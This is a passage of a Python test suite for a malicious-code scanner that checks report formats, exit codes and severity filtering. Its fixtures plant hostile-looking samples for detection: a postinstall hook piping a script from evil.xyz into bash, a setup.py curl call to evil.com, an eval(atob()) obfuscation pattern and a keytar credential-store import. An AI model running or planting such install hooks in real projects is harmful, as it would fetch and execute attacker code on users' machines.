    def test_render_rich_with_real_result(self, tmp_path: Path) -> None:
        from contagious_scan.scanner import scan

        (tmp_path / "hook.json").write_text(
            json.dumps({
                "scripts": {
                    "postinstall": "curl https://evil.xyz/install.sh | bash"
                }
            })
        )

        result = scan(tmp_path, min_severity="info")
        buf = StringIO()
        reporter = Reporter(OutputFormat.RICH, file=buf)
        code = reporter.render(result)
        output = buf.getvalue()

        assert isinstance(output, str)
        assert code in (EXIT_OK, EXIT_FINDINGS)

    def test_exit_code_one_on_real_malicious_content(self, tmp_path: Path) -> None:
        from contagious_scan.scanner import scan

        (tmp_path / "evil.js").write_text(
            "eval(atob('SGVsbG8='));"
        )

        result = scan(tmp_path, min_severity="info")
        code = determine_exit_code(result, min_severity="info")
        assert code == EXIT_FINDINGS

    def test_exit_code_zero_on_benign_content(self, tmp_path: Path) -> None:
        from contagious_scan.scanner import scan

        (tmp_path / "benign.js").write_text(
            "function greet(name) { return 'Hello, ' + name; }"
        )

        result = scan(tmp_path, min_severity="critical")
        code = determine_exit_code(result, min_severity="critical")
        assert code == EXIT_OK

    def test_plain_output_contains_real_pattern_id(self, tmp_path: Path) -> None:
        from contagious_scan.scanner import scan

        (tmp_path / "evil.js").write_text(
            "eval(atob('SGVsbG8='));"
        )

        result = scan(tmp_path, min_severity="info")
        buf = StringIO()
        reporter = Reporter(OutputFormat.PLAIN, min_severity="info", file=buf)
        reporter.render(result)
        output = buf.getvalue()
        # Should contain at least one pattern ID
        assert any(
            pid in output
            for pid in ["BT_JS_EVAL_ATOB", "OBF_", "API_", "NET_"]
        )

    def test_json_output_findings_have_all_keys(self, tmp_path: Path) -> None:
        from contagious_scan.scanner import scan

        (tmp_path / "evil.js").write_text(
            "eval(atob('SGVsbG8='));"
        )

        result = scan(tmp_path, min_severity="info")
        reporter = Reporter(OutputFormat.JSON, min_severity="info")
        output = reporter.render_to_string(result)
        data = json.loads(output)

        for finding in data["findings"]:
            assert "severity" in finding
            assert "file" in finding
            assert "line" in finding
            assert "pattern_id" in finding
            assert "description" in finding
            assert "matched_text" in finding
            assert "remediation" in finding
            assert "tags" in finding

    def test_real_scan_result_to_dict_is_json_serialisable(self, tmp_path: Path) -> None:
        from contagious_scan.scanner import scan

        (tmp_path / "setup.py").write_text(
            "import subprocess\n"
            "subprocess.run(['curl', 'https://evil.com'], check=True)\n"
        )

        result = scan(tmp_path, min_severity="info")
        # to_dict should be JSON-serialisable
        data = result.to_dict()
        json_str = json.dumps(data)  # must not raise
        recovered = json.loads(json_str)
        assert "findings" in recovered

    def test_ci_override_always_zero_with_real_malicious(self, tmp_path: Path) -> None:
        from contagious_scan.scanner import scan

        (tmp_path / "evil.js").write_text(
            "eval(atob('SGVsbG8='));\n"
            "const keytar = require('keytar');\n"
        )

        result = scan(tmp_path, min_severity="info")
        buf = StringIO()
        reporter = Reporter(OutputFormat.PLAIN, min_severity="info", file=buf, ci_override=True)
        code = reporter.render(result)
        assert code == EXIT_OK

    def test_min_severity_high_filters_real_findings(self, tmp_path: Path) -> None:
        from contagious_scan.scanner import scan

        # Network IOC may produce medium/info findings
        (tmp_path / "config.js").write_text(
            "const url = 'https://malware.xyz/gate';\n"
        )

        result_all = scan(tmp_path, min_severity="info")
        result_high = scan(tmp_path, min_severity="high")

        code_all = determine_exit_code(result_all, min_severity="info")
        code_high = determine_exit_code(result_high, min_severity="high")

        # Filtering by high should produce <= findings than info
        assert result_high.total_findings <= result_all.total_findings
        # Both codes should be valid
        assert code_all in (EXIT_OK, EXIT_FINDINGS)
        assert code_high in (EXIT_OK, EXIT_FINDINGS)
